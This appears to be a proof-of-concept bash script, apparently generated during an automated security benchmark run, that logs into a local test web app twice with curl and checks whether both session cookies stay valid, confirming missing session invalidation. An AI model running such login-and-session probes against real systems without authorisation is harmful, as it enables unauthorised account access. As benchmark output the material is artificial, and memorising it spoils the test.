#!/bin/bash
# POC: Demonstrates concurrent session vulnerability by creating two sessions for the same user and verifying both remain active simultaneously
# Target: ./repo
# Created: 2025-10-30T20:01:58.871Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

echo "=========================================="
echo "Concurrent Session Vulnerability POC"
echo "=========================================="
echo ""

TARGET="http://localhost:8082"
USERNAME="test"
PASSWORD="test"
USER_ID="10032"

echo "[*] Step 1: Performing first login to create session 1..."
RESPONSE1=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&user_id=$USER_ID&password=$PASSWORD" \
  -c /tmp/cookies1.txt)

SESSION1=$(echo "$RESPONSE1" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | tr -d '\r\n')

if [ -z "$SESSION1" ]; then
  echo "[!] Failed to obtain first session cookie"
  exit 1
fi

echo "[+] First login successful!"
echo "    Session 1: $SESSION1"
echo ""

echo "[*] Step 2: Performing second login to create session 2..."
sleep 1
RESPONSE2=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&user_id=$USER_ID&password=$PASSWORD" \
  -c /tmp/cookies2.txt)

SESSION2=$(echo "$RESPONSE2" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | tr -d '\r\n')

if [ -z "$SESSION2" ]; then
  echo "[!] Failed to obtain second session cookie"
  exit 1
fi

echo "[+] Second login successful!"
echo "    Session 2: $SESSION2"
echo ""

if [ "$SESSION1" = "$SESSION2" ]; then
  echo "[!] Warning: Both sessions have the same token (unexpected)"
fi

echo "[*] Step 3: Testing if both sessions remain active..."
echo ""

# Test first session
echo "[*] Testing Session 1 access to /dashboard..."
DASHBOARD1=$(curl -s -o /dev/null -w "%{http_code}" -b "session=$SESSION1" "$TARGET/dashboard")

if [ "$DASHBOARD1" = "200" ]; then
  echo "[+] Session 1 is ACTIVE - Dashboard accessible (HTTP $DASHBOARD1)"
else
  echo "[-] Session 1 is INACTIVE - Dashboard returned HTTP $DASHBOARD1"
fi

# Test second session
echo "[*] Testing Session 2 access to /dashboard..."
DASHBOARD2=$(curl -s -o /dev/null -w "%{http_code}" -b "session=$SESSION2" "$TARGET/dashboard")

if [ "$DASHBOARD2" = "200" ]; then
  echo "[+] Session 2 is ACTIVE - Dashboard accessible (HTTP $DASHBOARD2)"
else
  echo "[-] Session 2 is INACTIVE - Dashboard returned HTTP $DASHBOARD2"
fi

echo ""
echo "=========================================="
echo "RESULTS"
echo "=========================================="

if [ "$DASHBOARD1" = "200" ] && [ "$DASHBOARD2" = "200" ]; then
  echo "[!] VULNERABILITY CONFIRMED!"
  echo "[!] Both sessions remain active simultaneously"
  echo "[!] No session invalidation on new login"
  echo ""
  echo "Impact: An attacker with a stolen session token can"
  echo "maintain access even after the user logs in again."
  exit 0
else
  echo "[+] Vulnerability not confirmed - at least one session was invalidated"
  exit 1
fi